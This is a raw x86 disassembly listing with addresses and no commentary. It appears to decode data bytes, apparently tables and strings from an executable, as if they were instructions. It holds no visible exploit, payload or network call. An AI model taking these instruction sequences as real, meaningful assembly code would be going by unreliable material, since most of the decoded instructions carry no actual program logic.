  40566e:	and    eax,DWORD PTR [edx]
  405670:	rol    DWORD PTR [ebx],cl
  405672:	jnp    0x405674
  405674:	inc    ecx
  405675:	add    dl,bl
  405677:	add    edi,DWORD PTR [ebx+0x0]
  40567a:	popa   
  40567b:	add    dl,bl
  40567d:	add    edi,DWORD PTR [ebx+0x0]
  405680:	add    DWORD PTR [edx],0x7b03d3
  405686:	mov    DWORD PTR [edx],eax
  405688:	jae    0x405690
  40568a:	pop    es
  40568b:	or     BYTE PTR [eax+0x7b03d302],ah
  405691:	add    BYTE PTR [ecx+0x7b03d302],ah
  405697:	add    BYTE PTR [ecx+0x7067302],ch
  40569d:	or     al,al
  40569f:	add    dl,bl
  4056a1:	add    edi,DWORD PTR [ebx+0x0]
  4056a4:	rol    DWORD PTR [edx],0xd3
  4056a7:	add    edi,DWORD PTR [ebx+0x0]
  4056aa:	loopne 0x4056ae
  4056ac:	rol    DWORD PTR [ebx],cl
  4056ae:	jnp    0x4056b0
  4056b0:	loope  0x4056b4
  4056b2:	rol    DWORD PTR [ebx],cl
  4056b4:	jnp    0x4056b6
  4056b6:	add    DWORD PTR [ebx],eax
  4056b8:	rol    DWORD PTR [ebx],cl
  4056ba:	jnp    0x4056bc
  4056bc:	and    DWORD PTR [ebx],eax
  4056be:	rol    DWORD PTR [ebx],cl
  4056c0:	jnp    0x4056c2
  4056c2:	inc    ecx
  4056c3:	add    edx,ebx
  4056c5:	add    edi,DWORD PTR [ebx+0x0]
  4056c8:	pusha  
  4056c9:	add    edx,ebx
  4056cb:	add    edi,DWORD PTR [ebx+0x0]
  4056ce:	popa   
  4056cf:	add    edx,ebx
  4056d1:	add    edi,DWORD PTR [ebx+0x0]
  4056d4:	add    BYTE PTR [ebx],0xd3
  4056d7:	add    edi,DWORD PTR [ebx+0x0]
  4056da:	add    DWORD PTR [ebx],0x7b03d3
  4056e0:	mov    al,ds:0x7b03d303
  4056e5:	add    al,al
  4056e7:	add    edx,ebx
  4056e9:	add    edi,DWORD PTR [ebx+0x0]
  4056ec:	loopne 0x4056f1
  4056ee:	rol    DWORD PTR [ebx],cl
  4056f0:	jnp    0x4056f2
  4056f2:	add    BYTE PTR [ebx+edx*8],al
  4056f5:	add    edi,DWORD PTR [ebx+0x0]
  4056f8:	and    BYTE PTR [ebx+edx*8],al
  4056fb:	add    edi,DWORD PTR [ebx+0x0]
  4056fe:	inc    eax
  4056ff:	add    al,0xd3
  405701:	add    edi,DWORD PTR [ebx+0x0]
  405704:	pusha  
  405705:	add    al,0xd3
  405707:	add    edi,DWORD PTR [ebx+0x0]
  40570a:	add    BYTE PTR [ebx+edx*8],0x3
  40570e:	jnp    0x405710
  405710:	mov    al,ds:0x7b03d304
  405715:	add    al,al
  405717:	add    al,0xd3
  405719:	add    edi,DWORD PTR [ebx+0x0]
  40571c:	loopne 0x405722
  40571e:	rol    DWORD PTR [ebx],cl
  405720:	jnp    0x405722
  405722:	add    BYTE PTR ds:0x7b03d3,al
  405728:	and    BYTE PTR ds:0x7b03d3,al
  40572e:	inc    eax
  40572f:	add    eax,0x7b03d3
  405734:	pusha  
  405735:	add    eax,0x7b03d3
  40573a:	add    BYTE PTR ds:0x7b03d3,0xa0
  405741:	add    eax,0x7b03d3
  405746:	rol    BYTE PTR ds:0x7b03d3,0xe0
  40574d:	add    eax,0x7b03d3
  405752:	add    BYTE PTR [esi],al
  405754:	rol    DWORD PTR [ebx],cl
  405756:	jnp    0x405758
  405758:	and    BYTE PTR [esi],al
  40575a:	rol    DWORD PTR [ebx],cl
  40575c:	jnp    0x40575e
  40575e:	and    DWORD PTR [esi],eax
  405760:	rol    DWORD PTR [ebx],cl
  405762:	jnp    0x405764
  405764:	inc    eax
  405765:	push   es
  405766:	rol    DWORD PTR [ebx],cl
  405768:	jnp    0x40576a
  40576a:	pusha  
  40576b:	push   es
  40576c:	rol    DWORD PTR [ebx],cl
  40576e:	jnp    0x405770
  405770:	add    BYTE PTR [esi],0xd3
  405773:	add    edi,DWORD PTR [ebx+0x0]
  405776:	mov    al,ds:0x7b03d306
  40577b:	add    al,al
  40577d:	push   es
  40577e:	rol    DWORD PTR [ebx],cl
  405780:	jnp    0x405782
  405782:	loopne 0x40578a
  405784:	rol    DWORD PTR [ebx],cl
  405786:	jnp    0x405788
  405788:	add    BYTE PTR [edi],al
  40578a:	rol    DWORD PTR [ebx],cl
  40578c:	jnp    0x40578e
  40578e:	or     BYTE PTR [ecx],0xd3
  405791:	add    edi,DWORD PTR [ebx+0x0]
  405794:	mov    al,ds:0x7b03d309
  405799:	add    ch,al
  40579b:	add    dh,ah
  40579d:	add    ah,BYTE PTR [ebx]
  40579f:	add    edx,DWORD PTR [eax+0x3]
  4057a2:	push   0x3
  4057a4:	outs   dx,DWORD PTR ds:[esi]
  4057a5:	add    ebx,DWORD PTR [edi-0x38fc4afd]
  4057ab:	add    ecx,esi
  4057ad:	add    edi,ebx
  4057af:	add    esi,edx
  4057b1:	add    al,0xce
  4057b3:	add    eax,0x61b0605
  4057b8:	push   edi
  4057b9:	push   es
  4057ba:	call   0xc506:0xba06ae06
  4057c1:	push   es
  4057c2:	xlat   BYTE PTR ds:[ebx]
  4057c3:	push   es
  4057c4:	fld    QWORD PTR [esi]
  4057c6:	out    dx,al
  4057c7:	push   es
  4057c8:	pop    edi
  4057c9:	pop    es
  4057ca:	xchg   edx,eax
  4057cb:	pop    es
  4057cc:	hlt    
  4057cd:	pop    es
  4057ce:	or     eax,DWORD PTR [eax]
  4057d0:	add    DWORD PTR [eax],eax
  4057d2:	or     eax,0xe001100
  4057d7:	add    BYTE PTR [ebx],dl
  4057d9:	add    BYTE PTR [edi],cl
  4057db:	add    BYTE PTR [eax+eax*1],dl
  4057de:	add    BYTE PTR [eax],al
  4057e0:	fimul  DWORD PTR [eax]
  4057e2:	sub    al,BYTE PTR [ecx]
  4057e4:	add    BYTE PTR [eax],al
  4057e6:	loop   0x4057f0
  4057e8:	das    
  4057e9:	add    DWORD PTR [eax],eax
  4057eb:	add    ah,bh
  4057ed:	or     BYTE PTR [ecx+eax*1],dh
  4057f0:	add    BYTE PTR [eax],al
  4057f2:	adc    DWORD PTR [ecx],ecx
  4057f4:	cmp    DWORD PTR [ecx],eax
  4057f6:	add    BYTE PTR [eax],al
  4057f8:	and    BYTE PTR [ecx],cl
  4057fa:	cmp    DWORD PTR [ecx],eax
  4057fc:	add    BYTE PTR [eax],al
  4057fe:	xor    BYTE PTR [ecx],cl
  405800:	cmp    DWORD PTR [ecx],eax
  405802:	add    BYTE PTR [eax],al
  405804:	inc    eax
  405805:	or     DWORD PTR [ecx],edi
  405807:	add    DWORD PTR [eax],eax
  405809:	add    BYTE PTR [eax+0x9],dl
  40580c:	cmp    DWORD PTR [ecx],eax
  40580e:	add    BYTE PTR [eax],al
  405810:	popa   
  405811:	or     DWORD PTR ds:0x6b000001,edi
  405817:	or     DWORD PTR ds:0x76000001,edi
  40581d:	or     DWORD PTR [ecx+0x1],eax
  405820:	add    BYTE PTR [eax],al
  405822:	or     DWORD PTR [ecx],0x13d
  405828:	xchg   edx,eax
  405829:	or     DWORD PTR ds:0xa2000001,edi
  40582f:	or     DWORD PTR [esi+0x1],eax
  405832:	add    BYTE PTR [eax],al
  405834:	test   eax,0x13909
  405839:	add    BYTE PTR [esi+0x14b09],bh
  40583f:	add    BYTE PTR [esi+0x18a0b],ch
  405845:	add    BYTE PTR [ecx+0x13d0b],dh
  40584b:	add    BYTE PTR [ebx+0x1b10c],bl
  405851:	add    BYTE PTR [ebx+0x1ce0c],dh
  405857:	add    BYTE PTR [edi],dh
  405859:	adc    al,0xd3
  40585b:	add    DWORD PTR [eax],eax
  40585d:	add    BYTE PTR [edi],bh
  40585f:	adc    al,0xd8
  405861:	add    DWORD PTR [eax],eax
  405863:	add    BYTE PTR [edi+0x14],bl
  405866:	fadd   DWORD PTR [ecx]
  405868:	add    BYTE PTR [eax],al
  40586a:	outs   dx,DWORD PTR ds:[esi]
  40586b:	adc    al,0xd8
  40586d:	add    DWORD PTR [eax],eax
  40586f:	add    BYTE PTR [ebx+0x1d814],cl
  405875:	add    BYTE PTR [ecx+0x1d814],ch
  40587b:	add    BYTE PTR [ecx],al
  40587d:	or     ebx,eax
  40587f:	add    DWORD PTR [eax],eax
  405881:	add    dl,al
  405883:	adc    al,0xd8
  405885:	add    DWORD PTR [eax],eax
  405887:	add    ch,ah
  405889:	adc    al,0xd8
  40588b:	add    DWORD PTR [eax],eax
  40588d:	add    ch,dh
  40588f:	adc    al,0xd8
  405891:	add    DWORD PTR [eax],eax
  405893:	add    BYTE PTR [edi],cl
  405895:	adc    eax,0x1d8
  40589a:	sbb    eax,0x1d815
  40589f:	add    BYTE PTR [edx*1+0x1d8],dh
  4058a6:	dec    ecx
  4058a7:	adc    eax,0x1d8
  4058ac:	bound  edx,QWORD PTR ds:0x1d8
  4058b2:	jno    0x4058c9
  4058b4:	fadd   DWORD PTR [ecx]
  4058b6:	add    BYTE PTR [eax],al
  4058b8:	jg     0x4058cf
  4058ba:	fadd   DWORD PTR [ecx]
  4058bc:	add    BYTE PTR [eax],al
  4058be:	lea    edx,ds:0x1d8
  4058c4:	fwait
  4058c5:	adc    eax,0x1d8
  4058ca:	test   eax,0x1d815
  4058cf:	add    BYTE PTR [ebx+0x1d815],bh
  4058d5:	add    cl,cl
  4058d7:	adc    eax,0x1d8
  4058dc:	fcom   DWORD PTR ds:0x1d8
  4058e2:	in     eax,0x15
  4058e4:	fadd   DWORD PTR [ecx]
  4058e6:	add    BYTE PTR [eax],al
  4058e8:	add    edx,DWORD PTR [esi]
  4058ea:	fadd   DWORD PTR [ecx]
  4058ec:	add    BYTE PTR [eax],al
  4058ee:	sbb    dl,BYTE PTR [esi]
  4058f0:	fadd   DWORD PTR [ecx]
  4058f2:	add    BYTE PTR [eax],al
  4058f4:	cs push ss
  4058f6:	fadd   DWORD PTR [ecx]
  4058f8:	add    BYTE PTR [eax],al
  4058fa:	inc    ebx
  4058fb:	push   ss
  4058fc:	fadd   DWORD PTR [ecx]
  4058fe:	add    BYTE PTR [eax],al
  405900:	pop    esi
  405901:	add    ebx,eax
  405903:	add    DWORD PTR [eax],eax
  405905:	add    BYTE PTR [esi+0x16],cl
  405908:	fadd   DWORD PTR [ecx]
  40590a:	add    BYTE PTR [eax],al
  40590c:	inc    edi
  40590d:	add    ebx,eax
  40590f:	add    DWORD PTR [eax],eax
  405911:	add    BYTE PTR [esi+0x3],bh
  405914:	fadd   DWORD PTR [ecx]
  405916:	add    BYTE PTR [eax],al
  405918:	xchg   ebx,eax
  405919:	add    ebx,eax
  40591b:	add    DWORD PTR [eax],eax
  40591d:	add    BYTE PTR [ecx+0x16],ah
  405920:	fadd   DWORD PTR [ecx]
  405922:	add    BYTE PTR [eax],al
  405924:	jnp    0x40593c
  405926:	fadd   DWORD PTR [ecx]
  405928:	add    BYTE PTR [eax],al
  40592a:	nop
  40592b:	push   ss
  40592c:	fadd   DWORD PTR [ecx]
  40592e:	add    BYTE PTR [eax],al
  405930:	test   al,0x16
  405932:	fadd   DWORD PTR [ecx]
  405934:	add    BYTE PTR [eax],al
  405936:	rcl    BYTE PTR [esi],0xd8
  405939:	add    DWORD PTR [eax],eax
  40593b:	add    bh,dl
  40593d:	push   ss
  40593e:	fadd   DWORD PTR [ecx]
  405940:	add    BYTE PTR [eax],al
  405942:	out    dx,al
  405943:	push   ss
  405944:	fadd   DWORD PTR [ecx]
  405946:	add    BYTE PTR [eax],al
  405948:	add    eax,0x1d817
  40594d:	add    BYTE PTR [edi+edx*1],bl
  405950:	fadd   DWORD PTR [ecx]
  405952:	add    BYTE PTR [eax],al
  405954:	aaa    
  405955:	pop    ss
  405956:	fadd   DWORD PTR [ecx]
  405958:	add    BYTE PTR [eax],al
  40595a:	dec    esi
  40595b:	pop    ss
  40595c:	fadd   DWORD PTR [ecx]
  40595e:	add    BYTE PTR [eax],al
  405960:	popw   ss
  405962:	fadd   DWORD PTR [ecx]
  405964:	add    BYTE PTR [eax],al
  405966:	jl     0x40597f
  405968:	fadd   DWORD PTR [ecx]
  40596a:	add    BYTE PTR [eax],al
  40596c:	xchg   edx,eax
  40596d:	pop    ss
  40596e:	fadd   DWORD PTR [ecx]
  405970:	add    BYTE PTR [eax],al
  405972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405973:	pop    ss
  405974:	fadd   DWORD PTR [ecx]
  405976:	add    BYTE PTR [eax],al
  405978:	mov    esp,0x1d817
  40597d:	add    ch,dl
  40597f:	pop    ss
  405980:	fadd   DWORD PTR [ecx]
  405982:	add    BYTE PTR [eax],al
  405984:	jmp    0x0:0x1d817
  40598b:	sbb    al,bl
  40598d:	add    DWORD PTR [eax],eax
  40598f:	add    BYTE PTR [esi],dl
  405991:	sbb    al,bl
  405993:	add    DWORD PTR [eax],eax
  405995:	add    BYTE PTR [edi],ah
  405997:	sbb    al,bl
  405999:	add    DWORD PTR [eax],eax
  40599b:	add    BYTE PTR [eax+0x18],al
  40599e:	fadd   DWORD PTR [ecx]
  4059a0:	add    BYTE PTR [eax],al
  4059a2:	pop    eax
  4059a3:	sbb    al,bl
  4059a5:	add    DWORD PTR [eax],eax
  4059a7:	add    BYTE PTR [eax+0x18],dh
  4059aa:	fadd   DWORD PTR [ecx]
  4059ac:	add    BYTE PTR [eax],al
  4059ae:	test   DWORD PTR [eax],ebx
  4059b0:	fadd   DWORD PTR [ecx]
  4059b2:	add    BYTE PTR [eax],al
  4059b4:	pushf  
  4059b5:	sbb    al,bl
  4059b7:	add    DWORD PTR [eax],eax
  4059b9:	add    BYTE PTR [esi+0x1d818],dh
  4059bf:	add    al,dl
  4059c1:	sbb    al,bl
  4059c3:	add    DWORD PTR [eax],eax
  4059c5:	add    bh,dh
  4059c7:	sbb    al,bl
  4059c9:	add    DWORD PTR [eax],eax
  4059cb:	add    BYTE PTR [eax],dl
  4059cd:	sbb    eax,ebx
  4059cf:	add    DWORD PTR [eax],eax
  4059d1:	add    BYTE PTR [eax],ch
  4059d3:	sbb    eax,ebx
  4059d5:	add    DWORD PTR [eax],eax
  4059d7:	add    BYTE PTR [ecx+ebx*1-0x28],al
  4059db:	add    DWORD PTR [eax],eax
  4059dd:	add    BYTE PTR [edi+0x19],bl
  4059e0:	fadd   DWORD PTR [ecx]
  4059e2:	add    BYTE PTR [eax],al
  4059e4:	jne    0x4059ff
  4059e6:	fadd   DWORD PTR [ecx]
  4059e8:	add    BYTE PTR [eax],al
  4059ea:	daa    
  4059eb:	or     bl,al
  4059ed:	add    DWORD PTR [edx],eax
  4059ef:	add    BYTE PTR [ebx],bl
  4059f1:	add    BYTE PTR [ebx],al
  4059f3:	add    BYTE PTR [ecx],al
  4059f5:	add    BYTE PTR [eax+eax*1],bl
  4059f8:	add    eax,DWORD PTR [eax]
  4059fa:	add    al,BYTE PTR [eax]
  4059fc:	sbb    eax,0x1000500
  405a01:	add    BYTE PTR [esi],bl
  405a03:	add    BYTE PTR ds:0x1f000200,al
  405a09:	add    BYTE PTR [edi],al
  405a0b:	add    BYTE PTR [ecx],al
  405a0d:	add    BYTE PTR [eax],ah
  405a0f:	add    BYTE PTR [edi],al
  405a11:	add    BYTE PTR [ecx],al
  405a13:	add    BYTE PTR [edx],ah
  405a15:	add    BYTE PTR [ecx],cl
  405a17:	add    BYTE PTR [edx],al
  405a19:	add    BYTE PTR [ecx],ah
  405a1b:	add    BYTE PTR [ecx],cl
  405a1d:	add    BYTE PTR [edx],al
  405a1f:	add    BYTE PTR [ebx],ah
  405a21:	add    BYTE PTR [ebx],cl
  405a23:	add    BYTE PTR [ecx],al
  405a25:	add    BYTE PTR [eax+eax*1],ah
  405a28:	or     eax,DWORD PTR [eax]
  405a2a:	add    DWORD PTR [eax],eax
  405a2c:	add    BYTE PTR es:0x25000200,cl
  405a33:	add    BYTE PTR ds:0x28000100,cl
  405a39:	add    BYTE PTR [edi],cl
  405a3b:	add    BYTE PTR [edx],al
  405a3d:	add    BYTE PTR [edi],ah
  405a3f:	add    BYTE PTR [edi],cl
  405a41:	add    BYTE PTR [edx],al
  405a43:	add    BYTE PTR [ecx],ch
  405a45:	add    BYTE PTR [ecx],dl
  405a47:	add    BYTE PTR [ecx],al
  405a49:	add    BYTE PTR [edx],ch
  405a4b:	add    BYTE PTR [ecx],dl
  405a4d:	add    BYTE PTR [ecx],al
  405a4f:	add    BYTE PTR [eax+eax*1],ch
  405a52:	adc    eax,DWORD PTR [eax]
  405a54:	add    al,BYTE PTR [eax]
  405a56:	sub    eax,DWORD PTR [eax]
  405a58:	adc    eax,DWORD PTR [eax]
  405a5a:	add    al,BYTE PTR [eax]
  405a5c:	sub    eax,0x1001500
  405a61:	add    BYTE PTR [esi],ch
  405a63:	add    BYTE PTR ds:0x2f000200,dl
  405a69:	add    BYTE PTR [edi],dl
  405a6b:	add    BYTE PTR [ecx],al
  405a6d:	add    BYTE PTR [eax],dh
  405a6f:	add    BYTE PTR [edi],dl
  405a71:	add    BYTE PTR [edx],al
  405a73:	add    BYTE PTR [ecx],dh
  405a75:	add    BYTE PTR [ecx],bl
  405a77:	add    BYTE PTR [ecx],al
  405a79:	add    BYTE PTR [edx],dh
  405a7b:	add    BYTE PTR [ecx],bl
  405a7d:	add    BYTE PTR [ecx],al
  405a7f:	add    BYTE PTR [eax+eax*1],dh
  405a82:	sbb    eax,DWORD PTR [eax]
  405a84:	add    al,BYTE PTR [eax]
  405a86:	xor    eax,DWORD PTR [eax]
  405a88:	sbb    eax,DWORD PTR [eax]
  405a8a:	add    DWORD PTR [eax],eax
  405a8c:	add    BYTE PTR ss:0x35000200,bl
  405a93:	add    BYTE PTR ds:0x37000200,bl
  405a99:	add    BYTE PTR [edi],bl
  405a9b:	add    BYTE PTR [ecx],al
  405a9d:	add    BYTE PTR [eax],bh
  405a9f:	add    BYTE PTR [edi],bl
  405aa1:	add    BYTE PTR [edx],al
  405aa3:	add    BYTE PTR [ecx],bh
  405aa5:	add    BYTE PTR [ecx],ah
  405aa7:	add    BYTE PTR [edx],al
  405aa9:	add    BYTE PTR [esi+0x0],al
  405aac:	and    eax,DWORD PTR [eax]
  405aae:	add    al,BYTE PTR [eax]
  405ab0:	inc    edi
  405ab1:	add    BYTE PTR ds:0x4d000100,ah
  405ab7:	add    BYTE PTR [edi],ah
  405ab9:	add    BYTE PTR [edx],al
  405abb:	add    BYTE PTR [eax+eax*1+0x27],cl
  405abf:	add    BYTE PTR [edx],al
  405ac1:	add    BYTE PTR [eax+eax*1+0x29],dl
  405ac5:	add    BYTE PTR [edx],al
  405ac7:	add    BYTE PTR [ebp+0x0],dl
  405aca:	sub    eax,DWORD PTR [eax]
  405acc:	add    DWORD PTR [eax],eax
  405ace:	push   esi
  405acf:	add    BYTE PTR [ebx],ch
  405ad1:	add    BYTE PTR [edx],al
  405ad3:	add    BYTE PTR [edi+0x0],dl
  405ad6:	sub    eax,0x58000200
  405adb:	add    BYTE PTR [edi],ch
  405add:	add    BYTE PTR [edx],al
  405adf:	add    BYTE PTR [ecx+0x0],bl
  405ae2:	xor    DWORD PTR [eax],eax
  405ae4:	add    al,BYTE PTR [eax]
  405ae6:	pop    edx
  405ae7:	add    BYTE PTR [ebx],dh
  405ae9:	add    BYTE PTR [edx],al
  405aeb:	add    BYTE PTR [ebx+0x0],bl
  405aee:	xor    eax,0x5c000200
  405af3:	add    BYTE PTR [edi],dh
  405af5:	add    BYTE PTR [edx],al
  405af7:	add    BYTE PTR [ebp+0x0],bl
  405afa:	cmp    DWORD PTR [eax],eax
  405afc:	add    al,BYTE PTR [eax]
  405afe:	pop    esi
  405aff:	add    BYTE PTR [ebx],bh
  405b01:	add    BYTE PTR [edx],al
  405b03:	add    BYTE PTR [edi+0x0],bl
  405b06:	cmp    eax,0x60000200
  405b0b:	add    BYTE PTR [edi],bh
  405b0d:	add    BYTE PTR [edx],al
  405b0f:	add    BYTE PTR [ecx+0x0],ah
  405b12:	inc    ecx
  405b13:	add    BYTE PTR [edx],al
  405b15:	add    BYTE PTR [edx+0x0],ah
  405b18:	inc    ebx
  405b19:	add    BYTE PTR [edx],al
  405b1b:	add    BYTE PTR [ebx+0x0],ah
  405b1e:	inc    ebp
  405b1f:	add    BYTE PTR [edx],al
  405b21:	add    BYTE PTR [eax+eax*1+0x47],ah
  405b25:	add    BYTE PTR [edx],al
  405b27:	add    BYTE PTR [ebp+0x0],ah
  405b2a:	dec    ecx
  405b2b:	add    BYTE PTR [edx],al
  405b2d:	add    BYTE PTR [esi+0x0],ah
  405b30:	dec    ebx
  405b31:	add    BYTE PTR [edx],al
  405b33:	add    BYTE PTR [edi+0x0],ah
  405b36:	dec    ebp
  405b37:	add    BYTE PTR [edx],al
  405b39:	add    BYTE PTR [eax+0x0],ch
  405b3c:	dec    edi
  405b3d:	add    BYTE PTR [edx],al
  405b3f:	add    BYTE PTR [ecx+0x0],ch
  405b42:	push   ecx
  405b43:	add    BYTE PTR [edx],al
  405b45:	add    BYTE PTR [edx+0x0],ch
  405b48:	push   ebx
  405b49:	add    BYTE PTR [edx],al
  405b4b:	add    BYTE PTR [ebx+0x0],ch
  405b4e:	push   ebp
  405b4f:	add    BYTE PTR [edx],al
  405b51:	add    BYTE PTR [eax+eax*1+0x57],ch
  405b55:	add    BYTE PTR [edx],al
  405b57:	add    BYTE PTR [ebp+0x0],ch
  405b5a:	pop    ecx
  405b5b:	add    BYTE PTR [edx],al
  405b5d:	add    BYTE PTR [esi+0x0],ch
  405b60:	pop    ebx
  405b61:	add    BYTE PTR [edx],al
  405b63:	add    BYTE PTR [edi+0x0],ch
  405b66:	pop    ebp
  405b67:	add    BYTE PTR [edx],al
  405b69:	add    BYTE PTR [eax+0x0],dh
  405b6c:	pop    edi
  405b6d:	add    BYTE PTR [edx],al
  405b6f:	add    BYTE PTR [ecx+0x0],dh
  405b72:	popa   
  405b73:	add    BYTE PTR [edx],al
  405b75:	add    BYTE PTR [edx+0x0],dh
  405b78:	arpl   WORD PTR [eax],ax
  405b7a:	add    al,BYTE PTR [eax]
  405b7c:	jae    0x405b7e
  405b7e:	add    BYTE PTR gs:[edx],al
  405b81:	add    BYTE PTR [eax+eax*1+0x67],dh
  405b85:	add    BYTE PTR [edx],al
  405b87:	add    BYTE PTR [ebp+0x0],dh
  405b8a:	imul   eax,DWORD PTR [eax],0x760002
  405b90:	imul   eax,DWORD PTR [eax],0x2
  405b93:	add    BYTE PTR [edi+0x0],dh
  405b96:	ins    DWORD PTR es:[edi],dx
  405b97:	add    BYTE PTR [edx],al
  405b99:	add    BYTE PTR [eax+0x0],bh
  405b9c:	outs   dx,DWORD PTR ds:[esi]
  405b9d:	add    BYTE PTR [edx],al
  405b9f:	add    BYTE PTR [ecx+0x0],bh
  405ba2:	jno    0x405ba4
  405ba4:	add    al,BYTE PTR [eax]
  405ba6:	jp     0x405ba8
  405ba8:	jae    0x405baa
  405baa:	add    al,BYTE PTR [eax]
  405bac:	jnp    0x405bae
  405bae:	jne    0x405bb0
  405bb0:	add    al,BYTE PTR [eax]
  405bb2:	jl     0x405bb4
  405bb4:	ja     0x405bb6
  405bb6:	add    al,BYTE PTR [eax]
  405bb8:	jge    0x405bba
  405bba:	jns    0x405bbc
  405bbc:	add    al,BYTE PTR [eax]
  405bbe:	jle    0x405bc0
  405bc0:	jnp    0x405bc2
  405bc2:	add    al,BYTE PTR [eax]
  405bc4:	jg     0x405bc6
  405bc6:	jge    0x405bc8
  405bc8:	add    al,BYTE PTR [eax]
  405bca:	add    BYTE PTR [eax],0x7f
  405bcd:	add    BYTE PTR [edx],al
  405bcf:	add    BYTE PTR [ecx+0x2008100],al
  405bd5:	add    BYTE PTR [edx+0x2008300],al
  405bdb:	add    BYTE PTR [ebx+0x2008500],al
  405be1:	add    BYTE PTR [eax+eax*1+0x20087],al
  405be8:	test   DWORD PTR [eax],eax
  405bea:	mov    DWORD PTR [eax],eax
  405bec:	add    al,BYTE PTR [eax]
  405bee:	xchg   BYTE PTR [eax],al
  405bf0:	mov    eax,DWORD PTR [eax]
  405bf2:	add    al,BYTE PTR [eax]
  405bf4:	xchg   DWORD PTR [eax],eax
  405bf6:	lea    eax,[eax]
  405bf8:	add    al,BYTE PTR [eax]
  405bfa:	mov    BYTE PTR [eax],al
  405bfc:	pop    DWORD PTR [eax]
  405bfe:	add    al,BYTE PTR [eax]
  405c00:	mov    DWORD PTR [eax],eax
  405c02:	xchg   ecx,eax
  405c03:	add    BYTE PTR [edx],al
  405c05:	add    BYTE PTR [edx+0x2009300],cl
  405c0b:	add    BYTE PTR [ebx+0x2009500],cl
  405c11:	add    BYTE PTR [eax+eax*1+0x20097],cl
  405c18:	lea    eax,[eax]
  405c1a:	cdq    
  405c1b:	add    BYTE PTR [edx],al
  405c1d:	add    BYTE PTR [esi+0x2009b00],cl
  405c23:	add    BYTE PTR [edi+0x2009d00],cl
  405c29:	add    BYTE PTR [eax+0x2009f00],dl
  405c2f:	add    BYTE PTR [ecx+0x200a100],dl
  405c35:	add    BYTE PTR [edx+0x200a300],dl
  405c3b:	add    BYTE PTR [ebx+0x200a500],dl
  405c41:	add    BYTE PTR [eax+eax*1+0x200a7],dl
  405c48:	xchg   ebp,eax
  405c49:	add    BYTE PTR [ecx-0x69fffe00],ch
  405c4f:	add    BYTE PTR [ebx-0x68fffe00],ch
  405c55:	add    BYTE PTR [ebp-0x67fffe00],ch
  405c5b:	add    BYTE PTR [edi-0x66fffe00],ch
  405c61:	add    BYTE PTR [ecx-0x76ffed00],dh
  405c67:	add    ebp,edi
  405c69:	add    edx,DWORD PTR ds:0x81041e04
  405c6f:	add    al,0x8a
  405c71:	add    al,0x4c
  405c73:	add    eax,0x58d055c
  405c78:	jmp    0x6706:0x2d05fc05
  405c7f:	push   es
  405c80:	add    BYTE PTR [esi],0x8d
  405c83:	push   es
  405c84:	sbb    BYTE PTR [edi],al
  405c86:	add    al,0x80
  405c88:	add    BYTE PTR [eax],al
  405c8a:	or     eax,DWORD PTR [eax]
  405c8c:	add    BYTE PTR [eax],al
  405c8e:	add    BYTE PTR [eax],al
  405c90:	add    BYTE PTR [eax],al
  405c92:	add    DWORD PTR [eax],eax
  405c94:	add    BYTE PTR [eax],al
  405c96:	icebp  
  405c97:	add    esp,edi
  405c99:	sbb    al,0x0
  405c9b:	add    BYTE PTR [eax+eax*1],al
	...
  405ca6:	add    BYTE PTR [eax],al
  405ca8:	add    DWORD PTR [eax],eax
  405caa:	inc    eax
  405cab:	add    DWORD PTR [eax],eax
  405cad:	add    BYTE PTR [eax],al
  405caf:	add    BYTE PTR [ebx],cl
	...
  405cb9:	add    BYTE PTR [eax],al
  405cbb:	add    BYTE PTR [edx],cl
  405cbd:	add    BYTE PTR [ebx+0x1],ah
  405cc0:	add    BYTE PTR [eax],al
  405cc2:	add    BYTE PTR [eax],al
  405cc4:	add    al,0x0
	...
  405cce:	add    BYTE PTR [eax],al
  405cd0:	add    DWORD PTR [eax],eax
  405cd2:	dec    ecx
  405cd3:	add    DWORD PTR [eax],eax
  405cd5:	add    BYTE PTR [eax],al
  405cd7:	add    BYTE PTR [eax+eax*1],al
	...
  405ce2:	add    BYTE PTR [eax],al
  405ce4:	add    DWORD PTR [eax],eax
  405ce6:	xchg   DWORD PTR [edi],ebx
  405ce8:	add    BYTE PTR [eax],al
  405cea:	add    BYTE PTR [eax],al
  405cec:	add    al,0x0
	...
  405cf6:	add    BYTE PTR [eax],al
  405cf8:	add    DWORD PTR [eax],eax
  405cfa:	adc    esp,DWORD PTR [ecx]
  405cfc:	add    BYTE PTR [eax],al
  405cfe:	add    BYTE PTR [eax],al
  405d00:	or     DWORD PTR [eax],eax
  405d02:	or     BYTE PTR [eax],al
  405d04:	adc    BYTE PTR [eax],al
  405d06:	or     BYTE PTR [eax],al
  405d08:	adc    DWORD PTR [eax],eax
  405d0a:	or     BYTE PTR [eax],al
  405d0c:	outs   dx,DWORD PTR ds:[esi]
  405d0d:	add    BYTE PTR [edi],bh
  405d0f:	add    eax,edi
  405d11:	add    BYTE PTR [esi+0x4],al
  405d14:	leave  
  405d15:	add    BYTE PTR [esi+0x4],al
  405d18:	retf   
  405d19:	add    BYTE PTR [esi+0x4],al
  405d1c:	int    0x0
  405d1e:	inc    esi
  405d1f:	add    al,0xe9
  405d21:	add    bl,dl
  405d23:	add    al,0xf1
  405d25:	add    ch,ch
  405d27:	add    al,0xf9
  405d29:	add    BYTE PTR [esi+0x5],al
  405d2c:	inc    DWORD PTR [eax]
  405d2e:	rol    DWORD PTR [ecx*1+0x4505b101],cl
  405d35:	add    DWORD PTR [edi],edi
  405d37:	add    eax,DWORD PTR [ebp+0x1]
  405d3a:	mov    BYTE PTR [esi],al
  405d3c:	inc    ebp
  405d3d:	add    DWORD PTR [ebp-0x6afea6fa],edx
  405d43:	push   es
  405d44:	add    BYTE PTR [eax],al
  405d46:	add    BYTE PTR [eax],al
  405d48:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  405d4f:	gs add BYTE PTR ds:[ebx+0x76],al
  405d54:	inc    ebx
  405d55:	outs   dx,DWORD PTR ds:[esi]
  405d56:	ins    BYTE PTR es:[edi],dx
  405d57:	ins    BYTE PTR es:[edi],dx
  405d58:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405d5d:	outs   dx,BYTE PTR ds:[esi]
  405d5e:	inc    ebx
  405d5f:	ins    DWORD PTR es:[edi],dx
  405d60:	fs cs gs js 0x405dca
  405d65:	add    BYTE PTR [ebx+0x6f],al
  405d68:	ins    BYTE PTR es:[edi],dx
  405d69:	ins    BYTE PTR es:[edi],dx
  405d6a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
